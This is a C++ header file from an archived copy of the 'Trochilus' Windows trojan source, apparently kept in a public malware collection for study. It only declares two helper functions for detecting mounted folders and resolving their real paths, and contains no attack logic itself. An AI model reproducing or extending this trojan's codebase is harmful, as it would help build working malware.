/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once

namespace MountedFolder
{
	BOOL IsMountedFolder(LPCTSTR dirpath);

	BOOL GetRealDirpath(LPCTSTR dirpath, tstring& realDirpath);
}
